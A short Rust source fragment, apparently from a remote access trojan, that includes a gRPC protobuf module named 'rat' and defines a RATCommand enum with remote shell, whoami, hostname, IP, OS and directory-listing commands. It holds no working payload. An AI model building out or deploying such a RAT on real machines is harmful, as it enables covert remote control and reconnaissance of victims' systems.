pub mod rat {
    tonic::include_proto!("rat");
}

pub enum RATCommand {
    Cadence, 
    Dir,
    Help,
    Hostname,
    Ip,
    Ls,
    Os,
    Quit,
    Shell,
    Whoami,
}